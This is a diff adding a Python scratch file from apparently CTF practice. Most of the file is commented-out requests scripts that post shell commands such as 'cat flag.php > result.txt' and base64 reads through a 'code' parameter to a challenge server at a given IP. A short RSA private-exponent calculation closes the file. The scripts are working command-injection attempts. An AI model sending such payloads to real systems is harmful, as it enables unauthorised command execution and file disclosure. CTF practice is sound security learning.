@@ -1,0 +1,130 @@
+# import requests
+#
+# url = "http://27.25.151.237:32013/?md5=098f6bcd4621d373cade4e832627b4f6&key=1"
+# data = {
+#     "find": "test",
+#     "code": "cat flag.php > result.txt"
+# }
+# response = requests.post(url, data=data)
+# print(response.text)
+#
+# #--------------------------
+# import requests
+#
+# url = "http://27.25.151.237:32013/?md5=098f6bcd4621d373cade4e832627b4f6&key=1"
+# headers = {
+#     "Content-Type": "application/x-www-form-urlencoded"
+# }
+# data = {
+#     "find": "test",
+#     "code": "cat flag.php | tee result.txt"
+# }
+# response = requests.post(url, data=data, headers=headers)
+# print(response.text)
+
+# #-------------------------------
+#
+# import requests
+#
+# url = "http://27.25.151.237:32013/?md5=098f6bcd4621d373cade4e832627b4f6&key=1"
+# headers = {
+#     "Content-Type": "application/x-www-form-urlencoded"
+# }
+# data = {
+#     "find": "test",
+#     "code": "cat LOG.php | base64"
+# }
+# response = requests.post(url, data=data, headers=headers)
+# print(response.text)
+
+
+#---------------------------------
+# import requests
+#
+# # 假设这还是原来的CTF题目网址
+# url = "http://27.25.151.237:32013/?md5=098f6bcd4621d373cade4e832627b4f6&key=1"
+# headers = {
+#     "Content-Type": "application/x-www-form-urlencoded"
+# }
+# # 构造新的data，这次是为了读取result.txt文件
+# data = {
+#     "find": "test",  # 这里同样要保证find参数符合之前md5验证要求哦
+#     "code": "cat flag.php > result.txt"
+# }
+# new_response = requests.post(url, data=data, headers=headers)
+# print(new_response.text)
+
+#----------------------------------------
+
+# import requests
+#
+# # 还是原来的目标CTF题目网址
+# url = "http://27.25.151.237:32013/?md5=098f6bcd4621d373cade4e832627b4f6&key=1"
+# headers = {
+#     "Content-Type": "application/x-www-form-urlencoded"
+# }
+# # 构造新的数据，用于读取result.txt文件
+# new_data = {
+#     "find": "test",  # 这里要确保test依然符合前面md5验证要求，能让key置为1
+#     "code": "cat result.txt"
+# }
+# new_response = requests.post(url, data=new_data, headers=headers)
+# print(new_response.text)
+
+
+#---------------------------------
+# import requests
+#
+# url = "http://27.25.151.237:32013/?md5=098f6bcd4621d373cade4e832627b4f6&key=1"
+# headers = {
+#     "Content-Type": "application/x-www-form-urlencoded"
+# }
+# data = {
+#     "find": "test",  # 这里你需要先通过工具等找到符合md5('a01d1f3ed95dd14989ba9ac6daf874f5')的字符串来替换此处
+#     "code": "cat flag.php > result.txt && cat result.txt"
+# }
+# response = requests.post(url, data=data, headers=headers)
+
+
+#--------------------------------
+# import requests
+#
+# url = "http://27.25.151.237:32013/?md5=098f6bcd4621d373cade4e832627b4f6&key=1"
+# headers = {
+#     "Content-Type": "application/x-www-form-urlencoded"
+# }
+# data = {
+#     "find": "test",
+#     "code": "cat flag.php > /dev/stdout"
+# }
+# response = requests.post(url, data=data, headers=headers)
+# print(response.text)
+
+#-----------------------------
+
+#
+# import requests
+#
+# url = "http://27.25.151.237:32013/?md5=098f6bcd4621d373cade4e832627b4f6&key=1"
+# headers = {
+#     "Content-Type": "application/x-www-form-urlencoded"
+# }
+# data = {
+#     "find": "test",
+#     "code": "cat flag.php | base64 > result.txt && cat result.txt"
+# }
+# response = requests.post(url, data=data, headers=headers)
+# print(response.text)
+
+#------------------------------
+
+import gmpy2
+from Crypto.Util.number import *
+
+p = 473398607161
+q = 4511491
+e = 17
+
+d = gmpy2.invert(e, (q-1)*(p-1))
+
+print(d)
